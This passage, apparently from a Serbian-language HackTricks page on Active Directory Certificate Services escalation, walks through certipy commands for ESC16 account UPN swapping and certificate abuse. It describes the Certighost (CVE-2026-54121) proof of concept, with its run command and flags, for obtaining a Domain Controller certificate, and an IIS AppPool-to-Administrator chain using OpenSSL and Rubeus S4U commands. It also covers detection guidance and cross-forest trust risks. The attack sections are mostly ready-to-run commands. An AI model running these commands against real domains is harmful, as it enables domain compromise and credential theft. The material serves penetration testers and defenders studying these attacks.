    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```

**Korak 3: Autentifikujte se kao privilegovani korisnik koristeći „on-behalf-of“ sertifikat.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

## Bezbednosna ekstenzija onemogućena na CA (globalno)-ESC16

### Objašnjenje

**ESC16 (eskalacija privilegija zbog nedostajuće ekstenzije szOID_NTDS_CA_SECURITY_EXT)** opisuje globalno potiskivanje SID ekstenzije **szOID_NTDS_CA_SECURITY_EXT** na CA. Ovo je pokazatelj konfiguracije, a ne dokaz da se certifikat može koristiti za autentifikaciju kao drugi nalog. Za impersonaciju je takođe potrebna kontrola nad relevantnim atributima naloga ili mapiranjem, enrollable client-authentication template i putanja za mapiranje certifikata koju prihvata stvarni domain controller ili servis. Zakrpljeni KDC u režimu Full Enforcement odbija certifikate bez SID ekstenzije, osim ako imaju drugo snažno mapiranje; UPN-only Kerberos postupak u nastavku odnosi se na starije KDC-ove ili KDC-ove u režimu kompatibilnosti koji i dalje prihvataju slabo mapiranje. Pogledajte [Microsoftove smernice za mapiranje certifikata i sprovođenje pravila](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Više o detaljnom principu možete saznati i u ovom članku:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Zloupotreba

Sledeći istorijski primer Kerberos-a koji koristi samo UPN zasnovan je na [Certipy dokumentaciji za ESC16](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Potreban je KDC koji i dalje prihvata tako dobijeno slabo mapiranje; `StrongCertificateBindingEnforcement=1` više nije podržano zaobilaženje nakon bezbednosnog ažuriranja za Windows od 9. septembra 2025.<sup>[[14]](#references)</sup>

Da biste utvrdili da li je okruženje Active Directory Certificate Services (AD CS) ranjivo na **ESC16**】【。

```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```

**Korak 1: Zabeležite početni UPN naloga žrtve (opciono - za vraćanje u prethodno stanje).**  


```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -user 'victim' \
    read
```

**Korak 2: Ažurirajte UPN naloga žrtve tako da odgovara vrednosti `sAMAccountName` ciljnog administratora.  

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'administrator' \
    -user 'victim' update
```

**Korak 3: (Ako je potrebno) Nabavite akreditive za „žrtvin“ nalog (npr. putem Shadow Credentials).**

```shell
certipy shadow \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -account 'victim' \
    auto
```

**Korak 4: Zatražite sertifikat kao korisnik „žrtva“ pomoću predloška za autentifikaciju klijenta u koji nalog može da upiše (npr. „User“), na CA konfigurisanoj za ESC16.** CA izostavlja SID bezbednosno proširenje iz izdatog sertifikata, ali samo to ne uspostavlja upotrebljivo mapiranje za autentifikaciju. Podesite promenljivu okruženja za keš Kerberos akreditiva (naredba ljuske):

```bash
export KRB5CCNAME=victim.ccache
```

Zatim zatražite sertifikat:

```bash
certipy req \
    -k -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
    -template 'User'
```

**Korak 5: Vrati UPN naloga „žrtve“ na prethodnu vrednost.**

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
    -user 'victim' update
```

**Korak 6: Na starijem KDC-u ili KDC-u u režimu kompatibilnosti koji prihvata ovo slabo mapiranje, autentifikujte se kao ciljni administrator.**

```bash
certipy auth \
    -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'corp.local'
```

## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### Objašnjenje

**Certighost** zloupotrebljava **AD CS enrollment chase / callback putanju** u kojoj CA veruje atributima zahteva koje dostavlja podnosilac da bi utvrdio identitet koji treba da bude naveden u izdatom sertifikatu. U javnom PoC-u, posebno pripremljen zahtev sadrži:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: host/IP pod kontrolom napadača, sa kojim će CA uspostaviti vezu
- **`rmd`**: **DNS ime ciljnog Domain Controller-a** koji treba lažno predstaviti

Ako CA prati taj chase, povezaće se sa napadačem preko **SMB/LSA (`445`)** i **LDAP (`389`)**. Napadač koristi **postojeći machine account** (obično kreiran korišćenjem podrazumevanog **`ms-DS-MachineAccountQuota`**) kako bi se callback sesija autentifikovala kao važeći domain principal, dok lažni servisi umesto toga vraćaju atribute identiteta **ciljnog DC-a**:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Ako CA **kriptografski ne poveže vraćeni identitet sa autentifikovanim callback principal-om**, može da izda sertifikat za **Domain Controller**, iako se sesija autentifikovala pomoću machine account-a pod kontrolom napadača. Zbog toga se ova ranjivost konceptualno razlikuje od **Certifried**: umesto menjanja AD atributa kao što je `dNSHostName`, napadač **zamenjuje podatke o identitetu tokom CA callback provere**.<sup>[[2]](#references)</sup>

**Korisni preduslovi:**

- **Domain credentials** sa niskim privilegijama
- Mogućnost **kreiranja ili ponovne upotrebe computer account-a**
- Mrežna dostupnost **CA** do portova `389` i `445` pod kontrolom napadača
- Ranjiva / nezakrpljena CA putanja za obradu zahteva (Microsoft ažuriranje od **14. jula 2026.** dodalo je **DC validaciju za `cdc`** i **poređenje razrešenih SID vrednosti**)

Dobijeni **`.pfx`** se zatim može upotrebiti za **PKINIT**, čime se dobija **`.ccache`** i, u objavljenom PoC toku, **NT hash ciljnog DC-a**, što je obično dovoljno za **potpuno kompromitovanje domena**.

### Zloupotreba

Javni PoC automatizuje ceo lanac:<sup>[[1]](#references)</sup>

1. Kreira ili ponovo koristi **machine account** pod kontrolom napadača.
2. Pokreće **lažne LDAP i SMB/LSA listenere** na portovima `389` i `445`.
3. Šalje zahtev za sertifikat koji sadrži atribute **`cdc`** pod kontrolom napadača i ciljni atribut **`rmd`**.
4. Omogućava CA-u da se autentifikuje na lažnim listener-ima kao kontrolisani machine account, ali na upite o identitetu odgovara atributima **ciljnog DC-a**.
5. Dobija sertifikat za **DC** koji je potpisao CA, a zatim ga koristi za **PKINIT**.

```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```

Korisne runtime zastavice iz PoC-a:

- `--listener <ip>`: eksplicitno bira callback IP adresu koja se oglašava u `cdc`
- `--computer-name <NAME$>`: ponovo koristi postojeći machine account umesto kreiranja novog

**Operativne napomene:**

- Za PoC je potreban **root** jer vezuje **privileged ports** `389` i `445`.
- Uspešna eksploatacija lokalno upisuje **DC `.pfx`** i **Kerberos `.ccache`**.
- Pošto se certificate mapira na nalog **Domain Controller-a**, naredni koraci mogu da obuhvate **Kerberos auth zasnovan na certificate-u**, **DCSync** i ponovnu upotrebu oporavljenog **machine NT hash-a**.<sup>[[2]](#references)</sup>

## IIS AppPool prijava računara za Administrator-a na istom hostu

IIS pool koji radi kao `ApplicationPoolIdentity` koristi **computer account** svog hosta za odlazni pristup mrežnim resursima. Zato izvršavanje koda kao `IIS AppPool\<POOL>` ostaje sa niskim privilegijama u lokalnom token-u, ali može da pošalje AD CS zahtev koji CA autentifikuje kao `HOST$`; ovo je promena odlaznog identiteta, a ne impersonation token-a ili lokalna eskalacija u stilu Potato.<sup>[[19]](#references)[[20]](#references)</sup>

Ovaj lanac zahteva IIS host pridružen domenu, Enterprise CA dostupan preko RPC-a, objavljen machine-authentication template za koji računar ima prava za enrollment, podršku za PKINIT i dostupnost KDC/SMB-a. Prilagođeni pool identity menja odlazni principal, zato proverite da li pool zaista koristi `ApplicationPoolIdentity` pre nego što pretpostavite da je to `HOST$`.<sup>[[19]](#references)[[20]](#references)</sup>

### Enrollment pomoću ključa pod kontrolom napadača

Generišite par ključeva i CSR van IIS servera i sačuvajte private key. Sa kompromitovanog worker-a pošaljite **samo CSR**. [Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) instancira `CertificateAuthority.Request`, postavlja `CertificateTemplate:Machine`, poziva `ICertRequest::Submit` i vraća izdat certificate. Koristite CA konfiguracioni string `CAHOST\CA-NAME`; uobičajeni `Machine` template formira subject iz AD-a, tako da podaci o subject/SAN-u koje dostavlja requester nisu potrebni.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Povežite vraćeni certificate sa **odgovarajućim sačuvanim ključem**. `certutil -MergePFX machine_cert.cer machine_cert.pfx` radi samo kada Windows već može da poveže certificate sa dostupnim private key-em; za zasebne PEM fajlove, eksplicitno napravite PKCS#12:<sup>[[19]](#references)[[23]](#references)</sup>

```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
  -out machine_cert.pfx -name 'HOST$'
```

Koristite PFX za PKINIT i sačuvajte dobijeni TGT računara kao base64 umesto da ga odmah injectujete:<sup>[[5]](#references)[[19]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
  /password:PFX_PASSWORD /nowrap
```

### S4U2Self uz zamenu servisa na istom hostu

S4U2Self omogućava servisu da pribavi tiket **za sebe** koji sadrži autorizacione podatke drugog korisnika. Pomoću TGT-a računara, Rubeus može da zatraži takav tiket za privilegovanog korisnika, da prepravi naziv servisa u vraćenom KRB-CRED-u na CIFS i da ga ubaci. Ovo je lokalna primitiva „delegiraj samom sebi“: ne zahteva S4U2Proxy niti unos `msDS-AllowedToDelegateTo`.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>

```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
  /altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```

Zamenjeni ticket mogu da koriste samo servisi na **istom računarskom nalogu/ključu** (ovde, CIFS na `HOST`). To nije Administrator ticket koji se može ponovo koristiti na drugim mašinama u domenu. Takođe, prikazani rezultat je privilegovani SMB/pristup sistemu datoteka kao Administrator; za dobijanje procesa `NT AUTHORITY\SYSTEM` na lokalnoj mašini i dalje je potreban zaseban korak udaljenog izvršavanja.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Detekcija i ojačavanje bezbednosti

- Na CA-u povežite događaje Certification Services **4886** (zahtev primljen) i **4887** (sertifikat izdat) da biste otkrili neočekivane zahteve za `Machine` template koje podnose IIS serverski nalozi.<sup>[[19]](#references)[[24]](#references)</sup>
- Na DC-ovima, događaj **4768** sadrži polja sertifikata kada se koristi certificate pre-authentication; postavite upozorenje za neuobičajene PKINIT TGT zahteve za naloge veb-servera. Zatim pratite zahteve **4769** koji uključuju privilegovani impersonirani identitet i isti host. Pošto Rubeus `/altservice` menja naziv usluge u KRB-CRED-u na strani klijenta, nemojte zahtevati da naziv usluge u DC-side 4769 bude `cifs`.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- Potražite slučajeve u kojima `w3wp.exe` pristupa CA RPC endpoint-ima, neočekivano kreirane ASPX datoteke, pristup administrativnim deljenim resursima uz Kerberos autentifikaciju i aktivnosti izvlačenja tajni. Gde je moguće, ograničite pristup iz app-tier-a CA RPC/KDC/SMB resursima i uklonite prava za upis računara ili machine-authentication template-ove koji nisu operativno neophodni.<sup>[[19]](#references)</sup>

## Kompromitovanje šuma pomoću sertifikata, objašnjeno u pasivu

### Narušavanje forest trust-ova kompromitovanim CA-ovima

Konfiguracija za **upis između šuma** relativno je jednostavna. Administratori **objavljuju root CA sertifikat** iz resource forest-a **u account forest-ovima**, a **enterprise CA sertifikati** iz resource forest-a **dodaju se u `NTAuthCertificates` i AIA kontejnere u svakom account forest-u**. Drugim rečima, ovakvo podešavanje daje **CA-u u resource forest-u potpunu kontrolu** nad svim drugim šumama za koje upravlja PKI-jem. Ako ovaj CA **kompromituju napadači**, oni bi mogli da **falsifikuju** sertifikate za sve korisnike u resource i account forest-ovima, čime bi narušili bezbednosnu granicu šume.<sup>[[6]](#references)</sup>

### Prava za upis dodeljena stranim principal-ima

U okruženjima sa više šuma, treba biti oprezan sa Enterprise CA-ovima koji **objavljuju certificate template-ove** koji dozvoljavaju **Authenticated Users ili stranim principal-ima** (korisnicima/grupama izvan šume kojoj Enterprise CA pripada) **prava za upis i izmenu**.\
Prilikom autentifikacije preko trust-a, AD dodaje **Authenticated Users SID** korisnikovom token-u. Dakle, ako domen ima Enterprise CA sa template-om koji **dozvoljava Authenticated Users prava za upis**, korisnik iz druge šume bi potencijalno mogao da **upisuje u taj template**. Isto tako, ako template **izričito dodeljuje prava za upis stranom principal-u**, time se **stvara odnos kontrole pristupa između šuma**, koji principal-u iz jedne šume omogućava da **upisuje u template iz druge šume**.

Oba scenarija povećavaju **površinu napada** između šuma. Napadač bi mogao da iskoristi podešavanja certificate template-a da bi stekao dodatne privilegije u stranom domenu.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC repozitorijum](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Tehnička analiza Certighost-a](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – Blog SpecterOps-a](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Zloupotreba Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, nove metode autentifikacije i zahteva i još mnogo toga](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Zloupotreba mapiranja naloga pomoću Key Trust-a radi preuzimanja naloga](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Priča o (pogrešnoj) upotrebi Enhanced Key-a](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relay napadi na AD Certificate Services preko RPC-a](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: Shell pristup ADCS CA-u pomoću YubiHSM-a](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – Tehnika zloupotrebe ADCS ESC13](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – Tehnika zloupotrebe ADCS ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Eskalacija privilegija (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Nije samo još jedan AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Pogrešna konfiguracija i eksploatacija](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – Ponovni osvrt na „Delegate 2 Thyself“](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – PoC za IIS upis u AD CS](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – Eskalacija privilegija iz IIS AppPool-a preko AD CS RPC endpoint-a](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Identiteti Application Pool-a](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – komanda pkcs12](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Revizija Certification Services-a](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Događaj 4768: Zatražen je Kerberos authentication ticket](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Događaj 4769: Zatražen je Kerberos service ticket](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – Komplet alata za PowerShell eksploataciju AD CS-a](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
